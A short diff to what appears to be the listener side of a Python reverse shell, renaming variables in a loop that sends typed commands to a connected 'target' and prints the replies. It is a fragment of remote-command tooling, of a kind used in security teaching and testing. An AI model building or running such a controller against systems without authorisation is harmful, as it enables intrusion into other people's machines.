@@ -18,14 +18,14 @@ print("Target Connected!")
 while True:
 
     # SEND AND RECEIVE COMMANDS
-    message = input("* Shell#~%s: " % str(ip))
-    target.send(message.encode())
+    command = input("* Shell#~%s: " % str(ip))
+    target.send(command.encode())
     
-    if message == "q":
+    if command == "q":
         break
     else:
-        answer = target.recv(1024).decode()
-        print(answer)
+        result = target.recv(1024).decode()
+        print(result)
 
 # CLOSE CONNECTION
 s.close()
